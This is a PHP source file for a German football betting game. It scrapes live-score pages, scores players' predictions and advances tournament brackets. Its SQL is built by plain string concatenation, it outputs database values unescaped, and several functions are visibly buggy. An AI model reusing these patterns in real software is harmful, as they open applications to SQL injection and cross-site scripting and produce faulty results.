<?php

include("globals.php");

function parse_ticker2() {
    global $connection;
    // Spiele des Tages im Ticker anzeigen -> einfuegen in Blitztabelle
    $query_update = ' INSERT INTO blitz_ergebnis(key_spiel, tore_ms1, tore_ms2, tendenz) '
            . ' SELECT gruppenspiel.spiel_key, 0 AS tore_ms1, 0 AS tore_ms2,  0 AS tendenz '
            . ' FROM  gruppenspiel '
            . ' WHERE datum<=current_date AND status=0'
            . ' AND spiel_key NOT IN ( SELECT key_spiel FROM blitz_ergebnis ) ';
    $result = mysqli_query($connection, $query_update);

    // aktuell laufende Spiele markieren
    $query_update = "UPDATE blitz_ergebnis SET status=1 WHERE key_spiel IN "
            . "(SELECT spiel_key FROM gruppenspiel WHERE status=0 AND zeit - current_time<300)"; // 5 min vor Anpfiff=aktuell
    $result_update = mysqli_query($connection, $query_update);

    // Abfrage aktuelle Spiele
    $query_spiele = ' SELECT gruppenspiel.spiel_key, gruppenspiel.ticker_url, gruppenspiel.ticker_spiel_id '
            . ' FROM blitz_ergebnis, gruppenspiel '
            . ' WHERE blitz_ergebnis.key_spiel=gruppenspiel.spiel_key AND gruppenspiel.ticker_url IS NOT NULL';

    // Abfrage der Spiele starten und iterieren
    $result = mysqli_query($connection, $query_spiele) or die($query_spiele);
    error_reporting(0);
    while ($line = mysqli_fetch_array($result)) {
        $statusstring = '';
        $ticker_addr = str_replace('&amp;', '&', $line[1]);
        if ($ticker_addr != '') {
            $timeout = 3;
            $old = ini_set('default_socket_timeout', $timeout);
            $fp = fopen($ticker_addr, "r"); // Absoluter Pfad
            if ($fp) {
                ini_set('default_socket_timeout', $old);
                stream_set_timeout($fp, $timeout);
                stream_set_blocking($fp, 0);
//		$fp = fopen($ticker_addr,"r"); // Absoluter Pfad
                // Seite auslesen
                $torestr = '';
                $exit = 0;
                // Seite auslesen
                $team1str = '';
                $team2str = '';
                $tore1 = '';
                $tore2 = '';
                $beendet = 1;
                while ($exit == 0 AND ! feof($fp)) {
                    $buffer = fgets($fp);
                    if (strpos($buffer, '" class="zahll"') > 0) {
                        $team1str = $buffer;
                        //aAND blitz_ergebnis.status=1 AND blitz_ergebnis.status=1 lt="0" class="zahll"
                        $tore1 = substr($team1str, strpos($team1str, '" class="zahll"') - 1, 1);
                    }
                    if (strpos($buffer, '" class="zahlr"') > 0) {
                        $team2str = $buffer;
                        //alt="0" class="zahll"
                        $tore2 = substr($team2str, strpos($team2str, '" class="zahlr"') - 1, 1);
                    }
                    if (strpos($buffer, 'tr class') > 0) {
                        //$statusstring = substr($buffer, strpos($buffer, 'tr class')+8, 3);
                    }
                }


                fclose($fp); // Verbindung beenden
                // Ermitteln der Toranzahl
                $tendenz = 0;

                if ($tore1 >= '0' AND $tore1 <= '9' AND $tore2 >= '0' AND $tore2 <= '9') {
                    // Tendenz festlegen
                    if ($tore1 > $tore2)
                        $tendenz = 1;
                    if ($tore2 > $tore1)
                        $tendenz = 2;
                    // ermitteltes Ergebnis in Blitztabelle schreiben
                    $query_update = "UPDATE blitz_ergebnis SET tore_ms1=$tore1, tore_ms2=$tore2, tendenz=$tendenz WHERE key_spiel=$line[0]";
                    $result_update = mysqli_query($connection, $query_update);
                    // falls beendet, dann fest eintragen
                    if ($beendet >= 1) {
//			eintragung_spielergebnis($line[0], $tore1, $tore2);	// Spiel-Key, Tore1, Tore2
//			auswertung_spielerpunkte(-1);	// spiel_key
                    }
                }
            }
        }
    }

    // Nach einer bestimmten Zeit, Ergebnisse selbstaendig eintragen
    // , MINUTE(zeit - current_time)
    $query = 'SELECT blitz_ergebnis.key_spiel, blitz_ergebnis.tore_ms1, blitz_ergebnis.tore_ms2'
            . '  FROM blitz_ergebnis, gruppenspiel '
            . ' WHERE blitz_ergebnis.key_spiel=gruppenspiel.spiel_key '
            . '   AND (time_to_sec(current_time) - time_to_sec(gruppenspiel.zeit) > 10800 '  // spaetestens 7000 sec (=Anstoss + 117 min) Ergebnis selbstaendig eintragen
            . '       OR gruppenspiel.datum<current_date) '
            . '   AND blitz_ergebnis.status=1';

    /*
      $result = mysqli_query($connection, $query)  or die ($query);
      while ($line = mysqli_fetch_array($result)){
      eintragung_spielergebnis($line[0], $line[1], $line[2]);	// Spiel-Key, Tore1, Tore2
      auswertung_spielerpunkte($line[0]);	// spiel_key
      }
     */
    // beendete Spiele aus Ticker entfernen
}

/**
 * 		Spieler-Statistik auf aktuellen Stand bringen
 *     falls $gewaehltes_spiel=-1, dann Auswertung ALLER Spiele-Tipps
 */
function auswertung_spielerpunkte($gewaehltes_spiel) {
    global $connection;
    // PS: MySQL will mich nicht verstehen, deshalb umstaendlich - Viva Oracle
    $punkte_tendenz = PUNKTE_RICHTIGE_TENDENZ;
    $punkte_differenz = PUNKTE_RICHTIGE_DIFFERENZ;
    $punkte_exakte_tore = PUNKTE_RICHTIGE_TORANZAHL;
    $bonus_exakter_tipp = PUNKTE_EXAKTER_TIPP;

    $query_spieler = "SELECT spieler_key, vorname, spielername, punkte "
            . "  FROM spieler "
            . " ORDER BY punkte desc";
    $result_spieler = mysqli_query($connection, $query_spieler) or die("Abfrage spieler fehlgeschlagen!");

    while ($line_spieler = mysqli_fetch_array($result_spieler)) {
        $punkte_spieler = 0;
        $anz_exakt = 0;  // Zaehler fuer genaue Treffer
        $anz_tendenz = 0; // Zaehler fuer Tendenzen
        $query_tipps = " SELECT tips.key_spiel, gruppenspiel.key_ms1, man1.mannschaftsname " // 0, 1, 2
                . "			 , gruppenspiel.key_ms2, man2.mannschaftsname, tips.tore_ms1, tips.tore_ms2 " // 3, 4, 5, 6
                . "			 , tips.tendenz, gruppenspiel.tore_ms1, gruppenspiel.tore_ms2, gruppenspiel.tendenz " //7, 8, 9, 10
                . "		FROM tips, gruppenspiel, mannschaft AS man1, mannschaft AS man2 "
                . "	 WHERE tips.key_spiel = gruppenspiel.spiel_key  "
                . "		 AND gruppenspiel.key_ms1 = man1.mannschaft_key  "
                . "		 AND gruppenspiel.key_ms2 = man2.mannschaft_key  "
                . "		 AND gruppenspiel.status = 1 "
                . "		 AND tips.key_spieler =$line_spieler[0]	 ";

        // falls nur ein Spiel ausgewertet werden soll, WHERE-Klausel einschraenken
        if ($gewaehltes_spiel != -1) {
            $query_tipps = $query_tipps . "	 AND gruppenspiel.spiel_key = $gewaehltes_spiel ";
        }

        $result_tipps = mysqli_query($connection, $query_tipps) or die("Abfrage Tipps fehlgeschlagen!");

        // Hier wird eine Gesamt-Neuberechnung fuer jeden Spieler und jedem Tipp durchgef&uuml;hrt
        while ($line_tipps = mysqli_fetch_array($result_tipps)) {
            $punkte_spiel = 0;
            // Tendenz pruefen
            if ($line_tipps[7] == $line_tipps[10]) {
                $punkte_spiel = $punkte_spiel + $punkte_tendenz;
                $anz_tendenz = $anz_tendenz + 1;
            }
            // Differenz pruefen
            if ($line_tipps[5] - $line_tipps[6] == $line_tipps[8] - $line_tipps[9]) {
                $punkte_spiel = $punkte_spiel + $punkte_differenz;
            }
            // Pruefung Tore MS1
            if ($line_tipps[5] == $line_tipps[8]) {
                $punkte_spiel = $punkte_spiel + $punkte_exakte_tore;
            }
            // Pruefung Tore MS2
            if ($line_tipps[6] == $line_tipps[9]) {
                $punkte_spiel = $punkte_spiel + $punkte_exakte_tore;
            }
            // Bonus exakter Tipp
            if ($line_tipps[5] == $line_tipps[8] AND $line_tipps[6] == $line_tipps[9]) {
                $punkte_spiel = $punkte_spiel + $bonus_exakter_tipp;
                $anz_exakt = $anz_exakt + 1;
            }
            $punkte_spieler = $punkte_spieler + $punkte_spiel;
            // Update der erreichten Punkte des Spielers fuer das aktuelle Spiel
            $query_update = "UPDATE tips SET erreichte_punkte = " . $punkte_spiel
                    . "  WHERE key_spiel = " . $line_tipps[0]
                    . "    AND key_spieler = " . $line_spieler[0];
            $result_update = mysqli_query($connection, $query_update) or die("Update fehlgeschlagen!");
        }
        // Update der Gesamtpunktzahl des Spielers
        // Fall 1: nur Tipps zu einem Spiel werden ausgewertet
        if ($gewaehltes_spiel != -1) {
            $query_update = "UPDATE spieler SET punkte  = punkte + " . $punkte_spieler
                    . "                   ,exakte_tips = exakte_tips + " . $anz_exakt
                    . "                   ,richtige_Tendenz = richtige_Tendenz + " . $anz_tendenz
                    . "  WHERE spieler_key = " . $line_spieler[0];
        } else {
            // Fall 2: alle Tipps werden komplett neu ausgewertet
            $query_update = "UPDATE spieler SET punkte  = " . $punkte_spieler
                    . "                   ,exakte_tips = " . $anz_exakt
                    . "                   ,richtige_Tendenz = " . $anz_tendenz
                    . "  WHERE spieler_key = " . $line_spieler[0];
        }
        $result_update = mysqli_query($connection, $query_update) or die("Update fehlgeschlagen!");
    }
}

/**
 * 		Das uebergebene Spielergebnis in die DB eintragen und alle weiteren Schritte
 *     (Erzeugung K.O.Partien, Raus-Flag setzen, etc.) automatisch ausfuehren
 */
function eintragung_spielergebnis($gewaehltes_spiel, $tore_mannschaft1, $tore_mannschaft2) {
    global $connection;
    // einige Konstanten auslesen
    $punkte_sieg = PUNKTE_SIEG;
    $punkte_remis = PUNKTE_REMIS;
    // Tendenz ermitteln
    if ($tore_mannschaft1 > $tore_mannschaft2) {
        $tendenz = 1;
        $punkte_mannschaft1 = $punkte_sieg;
        $punkte_mannschaft2 = 0;
    };
    if ($tore_mannschaft1 < $tore_mannschaft2) {
        $tendenz = 2;
        $punkte_mannschaft1 = 0;
        $punkte_mannschaft2 = $punkte_sieg;
    };
    if ($tore_mannschaft1 == $tore_mannschaft2) {
        $tendenz = 0;
        $punkte_mannschaft1 = $punkte_remis;
        $punkte_mannschaft2 = $punkte_remis;
    };

    // fehlende Infos ermitteln
    $query = "SELECT key_ms1, key_ms2, spiel_art, gruppe, auto_platz_ms1 "  // 0, 1, 2, 3, 4
            . "   FROM gruppenspiel WHERE spiel_key=" . $gewaehltes_spiel;
    $result = mysqli_query($connection, $query) or die("Abfrage gruppenspiel fehlgeschlagen!");
    $line = mysqli_fetch_array($result);
    $mannschaft1 = $line[0];
    $mannschaft2 = $line[1];
    $turnierrunde = $line[2];
    $spielgruppe = $line[3];
    $ist_ko_partie = $line[4]; // das Attribut sollte als hinreichende Bedingung ausreichen
    // Mannschaftsstatistik aktualisieren fuer Gruppenspiele
    if ($spielgruppe != NULL) {
        $query_update = "UPDATE mannschaft SET anz_spiele = anz_spiele +1, punkte = punkte + $punkte_mannschaft1"
                . ", plusTore=plusTore + $tore_mannschaft1  , minusTore = minusTore + $tore_mannschaft2"
                . ", tordifferenz = tordifferenz + $tore_mannschaft1 - $tore_mannschaft2"
                . " WHERE mannschaft_key = $mannschaft1";
        $result_update = mysqli_query($connection, $query_update) or die("UPDATE mannschaft fehlgeschlagen!");
        $query_update = "UPDATE mannschaft SET anz_spiele = anz_spiele +1, punkte = punkte + $punkte_mannschaft2"
                . ", plusTore=plusTore + $tore_mannschaft2, minusTore = minusTore + $tore_mannschaft1"
                . ", tordifferenz = tordifferenz + $tore_mannschaft2 - $tore_mannschaft1"
                . " WHERE mannschaft_key = $mannschaft2";
        $result_update = mysqli_query($connection, $query_update) or die("UPDATE mannschaft fehlgeschlagen!");
    }

    // Spiel aktualisieren
    $query_update = " UPDATE gruppenspiel SET tore_ms1=$tore_mannschaft1, tore_ms2=$tore_mannschaft2 "
            . "                       ,tendenz=$tendenz ,status=1 "
            . " WHERE spiel_key = " . $gewaehltes_spiel;
    $result_update = mysqli_query($connection, $query_update) or die("Update gruppenspiel fehlgeschlagen!");


    // ist das Spiel relevant fuer eine folgende KO-Partie?
    if (AUTO_KO_BERECHNEN == 1) {
        $query = "SELECT spiel_key, key_ms1, key_ms2, spiel_art "  // 0, 1, 2, 3
                . "       , auto_ko_fk_ms1, auto_ko_fk_ms2 " // 4, 5
                . "       , auto_platz_ms1, auto_platz_ms2 " // 6, 7
                . "    FROM gruppenspiel "
                . "   WHERE auto_ko_fk_ms1=" . $gewaehltes_spiel
                . "      OR auto_ko_fk_ms2=" . $gewaehltes_spiel;
        $result = mysqli_query($connection, $query) or die("Abfrage Gruppenspiel fehlgeschlagen!");
        // dann entsprechend den richtigen Gegner fuer den Platzhalter eintragen
        while ($line = mysqli_fetch_array($result)) {
            $query_update = NULL;
            if ($line[4] == $gewaehltes_spiel AND ( ($tendenz == 1 AND $line[6] == 1) OR ( $tendenz == 2 AND $line[6] == 2)))
                $query_update = " UPDATE gruppenspiel SET key_ms1=$mannschaft1 WHERE spiel_key=$line[0]";
            if ($line[5] == $gewaehltes_spiel AND ( ($tendenz == 1 AND $line[6] == 1) OR ( $tendenz == 2 AND $line[6] == 2)))
                $query_update = " UPDATE gruppenspiel SET key_ms2=$mannschaft1 WHERE spiel_key=$line[0]";
            if ($line[4] == $gewaehltes_spiel AND ( ($tendenz == 2 AND $line[7] == 1) OR ( $tendenz == 1 AND $line[7] == 2)))
                $query_update = " UPDATE gruppenspiel SET key_ms1=$mannschaft2 WHERE spiel_key=$line[0]";
            if ($line[5] == $gewaehltes_spiel AND ( ($tendenz == 2 AND $line[7] == 1) OR ( $tendenz == 1 AND $line[7] == 2)))
                $query_update = " UPDATE gruppenspiel SET key_ms2=$mannschaft2 WHERE spiel_key=$line[0]";
            if ($query_update != NULL)
                $result_update = mysqli_query($connection, $query_update) or die("UPDATE Auto-Spieleintragung fehlgeschlagen (ko)!:<br>" . $query_update);
        }

        // Falls Spiele einer Gruppe abgeschlossen sind, dann KO-Partien generieren
        if ($spielgruppe != NULL) {
            // alle Spiele der Gruppe pruefen, ob ausgetragen
            $query = "SELECT count(1) FROM gruppenspiel WHERE status=0 AND gruppe=" . $spielgruppe;
            $result = mysqli_query($connection, $query) or die("Abfrage fehlgeschlagen!" . $query);
            $line = mysqli_fetch_array($result);
            if ($line[0] == 0) { // falls alle Spiele der Gruppe ausgetragen wurden, dann auswerten
                // Mannschaften in korrekter Tabellenreihenfolge
                $query_tabelle = "SELECT mannschaft_key FROM mannschaft WHERE gruppe=" . $spielgruppe . " ORDER BY punkte DESC, tordifferenz DESC, plusTore DESC ";
                $result_tabelle = mysqli_query($connection, $query_tabelle) or die("Abfrage fehlgeschlagen!" . $query_tabelle);
                $counter = 1;
                while ($linetab = mysqli_fetch_array($result_tabelle)) {
                    $query_update = " UPDATE gruppenspiel SET key_ms1=" . $linetab[0]
                            . " WHERE auto_gruppe_fk_ms1 = " . $spielgruppe . " AND auto_platz_ms1=" . $counter;
                    $result_update = mysqli_query($connection, $query_update) or die("UPDATE Auto-Spieleintragung fehlgeschlagen (tab)!");
                    $query_update = " UPDATE gruppenspiel SET key_ms2=" . $linetab[0]
                            . " WHERE auto_gruppe_fk_ms2 = " . $spielgruppe . " AND auto_platz_ms2=" . $counter;
                    $result_update = mysqli_query($connection, $query_update) or die("UPDATE Auto-Spieleintragung fehlgeschlagen (tab)!");

                    $counter = $counter + 1;
                    // alle Mannschaften der Gruppe die sich nicht fuer die naechste Runde qualifiziert haben
                    // aus dem Turnier werfen
                    $querycount = "SELECT count(1) FROM gruppenspiel WHERE (key_ms1=$linetab[0] OR key_ms2=$linetab[0]) AND status=0";
                    $resultcount = mysqli_query($connection, $querycount) or die("QUERY VerbleibendeMannschaftSpiele fehlgeschlagen!");
                    $linecount = mysqli_fetch_array($resultcount);
                    // keine verbleibenden Spiel, dann byebye
                    if ($linecount[0] == 0) {
                        $query_update = " UPDATE mannschaft SET status=0 WHERE mannschaft_key=" . $linetab[0];
                        $result_update = mysqli_query($connection, $query_update) or die("UPDATE KickGruppenphase fehlgeschlagen (tab)!");
                    }
                }
            }
        }
    } /* Ende (AUTO_KO_BERECHNEN == 1) */


    // nach KO-Partien die unterlegene Mannschaft automatisch aus dem Turnier nehmen
    if ($ist_ko_partie != NULL) {
        if ($tendenz == 1)
            $query_update = "UPDATE mannschaft SET status=0 WHERE mannschaft_key=$mannschaft2";
        if ($tendenz == 2)
            $query_update = "UPDATE mannschaft SET status=0 WHERE mannschaft_key=$mannschaft1";
        // nochmal pruefen, ob es bei Spiel um Platz drei Probleme gibt ...
        $result_update = mysqli_query($connection, $query_update) or die("UPDATE KickDasTeam fehlgeschlagen!");
    }

    // falls nur noch eine Mannschaft im Turnier, dann diese automatisch zum Sieger kueren
    if (AUTO_SIEGER_BERECHNEN == 1) {
        $query = "SELECT count(1) FROM mannschaft WHERE status=1 AND gewinner=0"; // gewinner=0 weil wegen darf nur einmal ausgefuehrt werden
        $result = mysqli_query($connection, $query) or die("QUERY ZaehleVerbleibendeMannschaften fehlgeschlagen!");
        $line = mysqli_fetch_array($result);
        if ($line[0] == 1) {
            $query_update = "UPDATE mannschaft SET gewinner=1 WHERE status=1 ";
            $result_update = mysqli_query($connection, $query_update) or die("UPDATE TurnierSieger fehlgeschlagen!");
            $query = "SELECT mannschaft_key FROM mannschaft WHERE gewinner=1";
            $result = mysqli_query($connection, $query) or die("QUERY ErmittleSiegerMannschaft fehlgeschlagen!");
            $line = mysqli_fetch_array($result);
            $query_update = "UPDATE spieler SET punkte=punkte+" . PUNKTE_RICHTIGER_MEISTER . " WHERE weltmeister=$line[0] ";
            $result_update = mysqli_query($connection, $query_update) or die("UPDATE TurnierSiegerPunkte fehlgeschlagen!");
        }
    }
    /*
      // Falls alle Spiele einer Runde ausgetragen, dann alle Runden freigeben
      // (bereits ausgetragene koennen sowieso nicht mehr getippt werden)
      if (AUTO_RUNDE_FREIGEBEN==1){
      $query_update = "UPDATE runde SET freigabe=1 WHERE runde_key > $turnierrunde";
      $result_update = mysqli_query($connection, $query_update) or die ("UPDATE AUTO-RundeSetzen(1) fehlgeschlagen!");
      $query_update = "UPDATE runde SET freigabe=0 WHERE runde_key <= $turnierrunde";
      $result_update = mysqli_query($connection, $query_update) or die ("UPDATE AUTO-RundeSetzen(1) fehlgeschlagen!");
      }
     */
}

function ersetze_umlaute($nachricht) {
    global $connection;
    $suche = array('&auml;', '&ouml;', '&uuml;', '&auml;', '&ouml;', '&uuml;', '&szlig;');
    $ersetze = array('&auml;', '&ouml;', '&uuml;', '&Auml;', '&Ouml;', '&Uuml;', '&szlig;', "\r\n", '', '', '', '', '', "\r\n");
    for ($i = 0; $i < 7; $i++)
        $nachricht = str_replace($suche[$i], $ersetze[$i], $nachricht);
}

function parse_ticker() {
    global $connection;

    // Spiele des Tages im Ticker anzeigen -> einfuegen in Blitztabelle
    $query_update = ' INSERT INTO blitz_ergebnis(key_spiel, tore_ms1, tore_ms2, tendenz) '
            . ' SELECT gruppenspiel.spiel_key, 0 AS tore_ms1, 0 AS tore_ms2,  0 AS tendenz '
            . ' FROM  gruppenspiel '
            . ' WHERE datum<=current_date AND status=0'
            . ' AND spiel_key NOT IN ( SELECT key_spiel FROM blitz_ergebnis ) ';
    $result = mysqli_query($connection, $query_update);

    // aktuell laufende Spiele markieren
    $query_update = "UPDATE blitz_ergebnis SET status=1 WHERE key_spiel IN (SELECT spiel_key FROM gruppenspiel WHERE status=0 AND zeit - current_time<300)"; // 5 min vor Anpfiff=aktuell
    $result_update = mysqli_query($connection, $query_update);

    // Abfrage aktuelle Spiele
    $query_spiele = ' SELECT gruppenspiel.spiel_key, gruppenspiel.ticker_url, gruppenspiel.ticker_spiel_id '
            . ' FROM blitz_ergebnis, gruppenspiel '
            . ' WHERE blitz_ergebnis.key_spiel=gruppenspiel.spiel_key AND gruppenspiel.ticker_url IS NOT NULL';

    // Abfrage der Spiele starten und iterieren
    $result = mysqli_query($connection, $query_spiele) or die($query_spiele);
    error_reporting(0);
    while ($line = mysqli_fetch_array($result)) {
        $matchMatch = $line[2];
//		echo $matchMatch;
        $statusstring = '';
        $ticker_addr = str_replace('&amp;', '&', $line[1]);
        if ($ticker_addr != '') {
//		echo $ticker_addr;
            $timeout = 10;
            $old = ini_set('default_socket_timeout', $timeout);
            ini_set('default_socket_timeout', $old);
            stream_set_timeout($fp, $timeout);
            stream_set_blocking($fp, true);
            $fp = fopen($ticker_addr, 'r'); // Absoluter Pfad
            if ($fp) {
//			echo "test";
                // Seite auslesen
                $torestr = '';
                $exit = 0;
                // Seite auslesen
                $team1str = '';
                $team2str = '';
                $tore1 = '';
                $tore2 = '';
                $resultFound = 0;
                $beendet = 0;
                while ($exit == 0 AND ! feof($fp)) {
                    $buffer = fgets($fp);
                    if (strpos($buffer, 'id="' . $matchMatch . '"') > 0) {
                        $resultFound = 1;
                        $buffer = substr($buffer, strpos($buffer, 'id="' . $matchMatch . '"'), 500);
                    }
                    if ($resultFound == 1 and strpos($buffer, 'div class="result"') > 0 and strpos($buffer, '<span class="res1">') > 0) {
                        if (strpos($buffer, 'span class="finished') > 0) {
                            $beendet = 1;
                        }
                        $test1 = strpos($buffer, '<span class="res1">') + 19;
                        $test2 = strpos($buffer, '<span class="res2">') + 19;
                        $tore1 = substr($buffer, $test1, 1);
                        $tore2 = substr($buffer, $test2, 1);


                        /*
                          echo $buffer;
                          $buffer = fgets($fp);
                          if (strpos($buffer, '<span style="color:#CC0000">') > 0){
                          $beendet=0;
                          };
                         */
//				$buffer = strip_tags($buffer);
//				$buffer = trim($buffer);
//				$tore1 = substr($buffer, 0, 1);
                        if (!is_numeric($tore1)) {
                            $beendet = 0;
                            $tore1 = substr($buffer, 10, 1);
                            if (!is_numeric($tore1)) {
                                $tore1 = '0';
                            }
                        }
//				$tore2 = substr($buffer, 2, 1);
                        if (!is_numeric($tore2)) {
                            $beendet = 0;
                            $tore2 = substr($buffer, 12, 1);
                            if (!is_numeric($tore2)) {
                                $tore2 = '0';
                            }
                        }
                        $resultFound = 0;
                    }
                }
                /*
                  while($exit==0 AND !feof($fp)) {
                  $buffer = fgets($fp);
                  if (strpos($buffer, '" class="zahll"') > 0){
                  $team1str = $buffer;
                  //aAND blitz_ergebnis.status=1 AND blitz_ergebnis.status=1 lt="0" class="zahll"
                  $tore1 = substr($team1str, strpos($team1str, '" class="zahll"')-1, 1);
                  }
                  if (strpos($buffer, '" class="zahlr"') > 0){
                  $team2str = $buffer;
                  //alt="0" class="zahll"
                  $tore2 = substr($team2str, strpos($team2str, '" class="zahlr"')-1, 1);
                  }
                  if (strpos($buffer, 'tr class') > 0){
                  //$statusstring = substr($buffer, strpos($buffer, 'tr class')+8, 3);
                  }
                  }
                 */

                fclose($fp); // Verbindung beenden
                // Ermitteln der Toranzahl
                $tendenz = 0;

                if ($tore1 >= '0' AND $tore1 <= '9' AND $tore2 >= '0' AND $tore2 <= '9') {
                    // Tendenz festlegen
                    if ($tore1 > $tore2)
                        $tendenz = 1;
                    if ($tore2 > $tore1)
                        $tendenz = 2;
                    // ermitteltes Ergebnis in Blitztabelle schreiben
                    $query_update = "UPDATE blitz_ergebnis SET tore_ms1=$tore1, tore_ms2=$tore2, tendenz=$tendenz WHERE key_spiel=$line[0]";
                    $result_update = mysqli_query($connection, $query_update);
                    // falls beendet, dann fest eintragen

                    if ($beendet >= 100) {
                        eintragung_spielergebnis($line[0], $tore1, $tore2); // Spiel-Key, Tore1, Tore2
                        auswertung_spielerpunkte(-1); // spiel_key
                    }
                }
            }
        }
    }
    /*
      // Nach einer bestimmten Zeit, Ergebnisse selbstaendig eintragen
      // , MINUTE(zeit - current_time)
      $query= 'SELECT blitz_ergebnis.key_spiel, blitz_ergebnis.tore_ms1, blitz_ergebnis.tore_ms2'
      . '  FROM blitz_ergebnis, gruppenspiel '
      . ' WHERE blitz_ergebnis.key_spiel=gruppenspiel.spiel_key '
      . '   AND (time_to_sec(current_time) - time_to_sec(gruppenspiel.zeit) > 7000 '  // spaetestens nach etwa 10 Minuten Wartezeit Ergebnis selbstaendig eintragen
      . '       OR gruppenspiel.datum<current_date) '
      . '   AND blitz_ergebnis.status=1';


      $result = mysqli_query($connection, $query)  or die ($query);
      while ($line = mysqli_fetch_array($result)){
      eintragung_spielergebnis($line[0], $line[1], $line[2]);	// Spiel-Key, Tore1, Tore2
      auswertung_spielerpunkte($line[0]);	// spiel_key
      }
     */
    // beendete Spiele aus Ticker entfernen
    $query_update = 'DELETE FROM blitz_ergebnis WHERE key_spiel IN (SELECT spiel_key FROM gruppenspiel WHERE status > 0)';
    $result = mysqli_query($connection, $query_update) or die($query_update);
}

/**
 * 		Bezeichnung eines Spiels ermitteln
 */
function ermittle_spiel_bezeichnung($key) {
    global $connection;
    $subquery = "SELECT bezeichnung FROM gruppenspiel WHERE spiel_key=$key";
    $subresult = mysqli_query($connection, $subquery) or die("Subquery KO fehlgeschlagen!");
    $subline = mysqli_fetch_array($subresult);
    return $subline[0];
}

/**
 * 		Bezeichnung einer Gruppe ermitteln
 */
function ermittle_gruppen_bezeichnung($key) {
    global $connection;
    $subquery = "SELECT bezeichnung FROM gruppe WHERE gruppe_key=$key";
    $subresult = mysqli_query($connection, $subquery) or die("Subquery KO fehlgeschlagen!");
    $subline = mysqli_fetch_array($subresult);
    return $subline[0];
}

/**
 * 		Key der NULL-Mannschaft (Platzhalter) ermitteln
 */
function ermittle_null_mannschaft() {
    global $connection;
    $subquery = "SELECT mannschaft_key FROM mannschaft WHERE is_null=1";
    $subresult = mysqli_query($connection, $subquery) or die("Subquery KO fehlgeschlagen!");
    $subline = mysqli_fetch_array($subresult);
    return $subline[0];
}

/**
 * Hilfsunktion, als Unterstuetzung bei textueller Einzahl/Mehrzahl-Ersetzung
 */
function sage_mir($anzahl, $einzahl, $mehrzahl, $postfix) {
    if ($anzahl == 1)
        return "ein" . $postfix . " " . $einzahl;
    else
        return $anzahl . " " . $mehrzahl;
}

/**
 * Letzte Beitraege im Stammtisch anzeigen
 */
function stammtisch_ticker() {
    global $connection;
    $query = "SELECT name, date, time FROM st_entries ORDER BY id DESC LIMIT 0,3";
    $result = mysqli_query($connection, $query) or die("Abfrage News fehlgeschlagen!");
    while ($line = mysqli_fetch_array($result)) {
        echo "$line[1] um $line[2]<br>von $line[0]<p>";
    }
    echo "<center><a href=\"" . STAMMTISCH_HOME . "index.php\" class=\"news\">Zum Stammtisch ...</a></center><p>";
}

/**
 * Letzte News (nur Titel) anzeigen
 */
function news_flash() {
    global $connection;
    $query = "SELECT titel, DATE_FORMAT(datum, '%d.%m.%Y') FROM news ORDER BY datum DESC, zeit DESC LIMIT 0,2";
    $result = mysqli_query($connection, $query) or die("Abfrage News fehlgeschlagen!");
    while ($line = mysqli_fetch_array($result)) {
        echo "$line[1]<br>$line[0]<p>";
    }
    echo "<center><a href=\"" . TIPPSPIEL_HOME . "turnier_news.php\" class=\"news\">Alle News ...</a></center><p>";
}

/**
 * Ergebnisse aktueller Spiele anzeigen
 */
function live_ergebnis() {
    global $connection;
    // Ticker ggf. aktualisieren
    parse_ticker();
    // Anzeige der letzten naechsten Spiele
    $query = "SELECT mann1.mannschaft_key, mann1.mannschaftsname, blitz_ergebnis.tore_ms1" // 0, 1, 2
            . "      ,mann2.mannschaft_key, mann2.mannschaftsname, blitz_ergebnis.tore_ms2 " // 3, 4, 5
            . "      , gruppenspiel.ticker_url ,TIME_FORMAT(gruppenspiel.zeit, '%H:%i'), time_to_sec(zeit) - time_to_sec(current_time) " // 6, 7, 8
            . "  FROM gruppenspiel, mannschaft mann1, mannschaft mann2, blitz_ergebnis "
            . " WHERE mann1.mannschaft_key=gruppenspiel.key_ms1 "
            . "   AND mann2.mannschaft_key=gruppenspiel.key_ms2 "
            . "   AND gruppenspiel.spiel_key=blitz_ergebnis.key_spiel "
            . " ORDER BY gruppenspiel.datum ASC, zeit ASC";
    $result = mysqli_query($connection, $query) or die("Abfrage1 fehlgeschlagen!");
    echo "<b><center>Aktuelle Ergebnisse</center></b><table >";
    while ($line = mysqli_fetch_array($result)) {
        echo "<tr> <td align='LEFT' style=\"font-size:7pt\">$line[1]<br>$line[4]</td> ";
        echo "<td>$line[2]<br>$line[5]</td>";
        // Ticker anzeigen, falls die Zeit gekommen ist
        if ($line[8] < 600) // 10 Minuten vor Anpfiff Link anzeigen
            echo "<td> <a href=$line[6] class=\"news\" target='_blank'>live</a></td> </tr>";
        else
            echo "<td style=\"font-size:7pt\" align=center> -> Start $line[7] Uhr</td> </tr>";
    }
    if (mysqli_num_rows($result) == 0) {
        echo "<tr><td style=\"font-size:7pt\">++  Es finden aktuell  ++</td></tr>";
        echo "<tr><td style=\"font-size:7pt\">++ keine Spiele statt! ++</td></tr>";
    } else {
        echo "<center><a href=\"" . TIPPSPIEL_HOME . "blitzrangliste.php\" class=\"news\">Blitzrangliste...</a></center><p>";
    }
    echo "</table>";
}

/**
 * Letzte Ergebnisse darstellen
 */
function ergebnis_ticker() {
    global $connection;
    // Anzeige der letzten naechsten Spiele
    $query = "SELECT mann1.mannschaft_key, mann1.mannschaftsname, gruppenspiel.tore_ms1" // 0, 1, 2
            . "      ,mann2.mannschaft_key, mann2.mannschaftsname, gruppenspiel.tore_ms2" // 3, 4, 5
            . "      , DATE_FORMAT(gruppenspiel.datum, '%d.%m')" // 6
            . "      ,TIME_FORMAT(gruppenspiel.zeit, '%H:%i'), gruppenspiel.status"
            . "  FROM gruppenspiel, mannschaft mann1, mannschaft mann2 "
            . " WHERE mann1.mannschaft_key=gruppenspiel.key_ms1 "
            . "   AND mann2.mannschaft_key=gruppenspiel.key_ms2 "
            . "   AND gruppenspiel.status=1 "
            . " ORDER BY gruppenspiel.datum DESC, zeit DESC LIMIT 0,2";
    $result = mysqli_query($connection, $query) or die("Abfrage1 fehlgeschlagen!");
    echo "<b><center>Letzte Spiele</center></b><table >";
    while ($line = mysqli_fetch_array($result)) {
        echo "<tr> <td align='LEFT' style=\"font-size:7pt\">$line[1]<br>$line[4]</td> ";
        echo "<td>$line[2]<br>$line[5]</td> </tr>";
    }
    if (mysqli_num_rows($result) == 0) {
        echo "<tr><td style=\"font-size:7pt\">Das Turnier wurde noch nicht gestartet!</td></tr>";
    }
    echo "</table>";

